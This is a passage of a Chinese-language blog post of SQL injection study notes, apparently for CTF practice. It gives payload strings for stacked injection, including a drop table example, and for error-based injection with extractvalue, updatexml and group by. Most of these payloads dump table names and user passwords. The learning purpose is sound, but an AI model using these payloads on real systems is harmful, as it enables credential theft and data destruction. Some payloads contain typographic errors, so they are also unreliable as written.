+<p>当然了，堆叠注入的条件比较苛刻，可能受到API或者数据库引擎不支持的限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">未对 &quot;;&quot; 号进行过滤；未禁止执行多条sql语句</span><br></pre></td></tr></table></figure>
+
+<p>举例一：</p>
+<p>新建表，表名：test</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;create table test like users; </span><br></pre></td></tr></table></figure>
+
+<p>删除表，表名：test</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;drop table test;</span><br></pre></td></tr></table></figure>
+
+<p>……还有很多，可以自行搜索</p>
+<h6 id="表结构："><a href="#表结构：" class="headerlink" title="表结构："></a>表结构：</h6><p>​        表结构就是定义数据表文件名，确定数据表包含哪些字段，各字段的字段名、字段类型、及宽度，并将这些数据输入到计算机当中。</p>
+<pre><code>    查看字段值：
+
+            1&#39;;select 字段名 from `纯数字表名`;
+
+            1&#39;;select 字段名 from 非纯数字表名;
+</code></pre>
+<h2 id="六、二次注入"><a href="#六、二次注入" class="headerlink" title="六、二次注入"></a>六、二次注入</h2><p>概念：</p>
+<pre><code>    二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。二次注入是 SQL 注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。
+</code></pre>
+<p>原理：</p>
+<pre><code>    在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但是addslashes 有一个特点就是虽然参数在过滤后会添加  “\”  进行转义，但是 “\” 并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。数据中一般带有单引号和 ＃ 号，然后下次使用在拼凑 SQL 中。
+</code></pre>
+<p>二次注入没有什么命令需要去记住，适合用于获取管理员登录权限的思路七、报错注入</p>
+<h3 id="七、报错注入"><a href="#七、报错注入" class="headerlink" title="七、报错注入"></a>七、报错注入</h3><p><strong>使用场景：</strong>在联合查询无法实现的情况下可以尝试使用报错注入，比如说 <strong>union</strong> 被过滤</p>
+<p><strong>理解</strong>：一般指页面没有回显，但是SQL语句执行可以输出<strong>错误信息</strong>的情况。报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
+<p>相关函数：</p>
+<p><strong>extractvalue (XML_document, XPath_string)</strong></p>
+<p>​    第一个参数：XML_document 是目标XML文档<br>​    第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内   容，报错注入正是利用这一点<br><strong>updatexml (XML_document, XPath_string, new_value)</strong></p>
+<p>第一个参数：XML_document 是目标XML文档<br>第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容，     报错注入正 是利用这一点<br>第三个参数：new_value 用来替换查找到的符合条件的数据<br>例如： 1’ or updatexml(1,concat(‘#’,database()),1)#，由于 # 不属于xpath语法格式，因此报出xpath语法错误。</p>
+<p>①、extractvalue报错注入<br>❤ 爆破数据库名</p>
+<p>1’ and (extractvalue(1,concat(0x5c,database(),0x5c)))#</p>
+<p>❤ 爆破表格名</p>
+<p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x5c)))#</p>
+<p>❤ 爆破字段名</p>
+<p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’表格名’),0x5c)))#</p>
+<p>❤ 爆破字段值</p>
+<p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from 表格名),0x5c)))#</p>
+<p>注意：</p>
+<p>若是对于修改密码页面则需要另一种方法爆破对应用户密码</p>
+<p>1’ and (extractvalue(1,concat(0x5c,(select password from (select password from users where username&#x3D;’想要爆破的用户名’) b) ,0x5c)))#</p>
+<p>②、updatexml报错注入<br>❤ 爆破数据库名</p>
+<p>1’ or updatexml(1,concat(‘#’,database()),1)#</p>
+<p>❤ 爆破表格名</p>
+<p>1’ or updatexml(1,concat(0x7e，select table_name from information_schema.tables where table_schema &#x3D; ‘数据库名’,0x7e),1)#</p>
+<p>❤ 爆破表格字段</p>
+<p>1’ or updatexml(1,concat(‘#’,select group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘表格名’),1)#</p>
+<p>❤ 获取字段值</p>
+<p>1’ or updatexml(1,concat(‘#’,select group_concat(id,username,password) from 表格名),1)#</p>
+<p>❤爆破对应用户的密码</p>
+<p>123’ and (updatexml(1,concat(0x5c,(select password from (select password from users where username&#x3D;’用户名’) b),0x5c),1))#</p>
+<p>③、group by报错注入<br>推荐一篇文章，便于理解 group by 报错注入，该注入方法比较复杂</p>
+<p>深入理解group by报错注入-CSDN博客</p>
+<p>❤爆破数据库</p>
+<p>123’ and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#</p>
+<p>❤爆破出所有数据库表格</p>
+<p>1’ and (select count(*) from information_schema.tables where table_schema&#x3D;database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e,floor(rand(0)*2)))#</p>
+<p>❤爆破字段名</p>
+<p>1’ and (select count(*) from information_schema.columns where table_schema&#x3D;database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e,floor(rand(0)*2)))#</p>
+<p>❤爆破字段值</p>
+<p>1’ and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#</p>
+<p>❤爆破用户密码</p>
+<p>1’ and (select 1 from(select count(*) from information_schema.columns where table_schema&#x3D;database() group by concat(0x7e,(select password from users where username&#x3D;’用户名’),0x7e,floor(rand(0)*2)))a)#</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79218813/article/details/135090595">https://blog.csdn.net/2301_79218813/article/details/135090595</a></p>
+<p>SQL注入流程：</p>
+<ol>
+<li>是否存在注入并且判断注入类型</li>
+<li>判断字段数 ‘ order by 数字 – ‘</li>
+<li>确定回显点 -1 ‘ union select 1,2 – ‘</li>
+<li>查询数据库信息 @@version @@datadir</li>
+<li>查询用户名，数据库名 user() database()</li>
+<li>查询表名 -1 ‘ union select 1,2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;’数据库名’ – ‘</li>
+<li>查询列名 -1 ‘ union select 1,2, group_concat(column_name) from information_schema.columns where table_name&#x3D;’表名’ – ‘</li>
+<li>查询flag -1 ‘ union select 1,2, group_concat(flag所在的列名) from 表名</li>
+</ol>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Qiu</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://Qiu-lan.github.io/2025/01/29/SQL/">https://Qiu-lan.github.io/2025/01/29/SQL/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">Qiu</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: '',
+        owner: '',
+        admin: null,
+        id: '2025-01-29T12-52-18',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2025/03/25/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="php伪协议">
+                        
+                        <span class="card-title">php伪协议</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-03-25
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Qiu
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Current&nbsp;<i class="far fa-dot-circle"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/01/29/SQL/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="SQL注入">
+                        
+                        <span class="card-title">SQL注入</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-29
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Qiu
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2025</span>
+            
+            <a href="/about" target="_blank">Qiu</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:2021908332@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
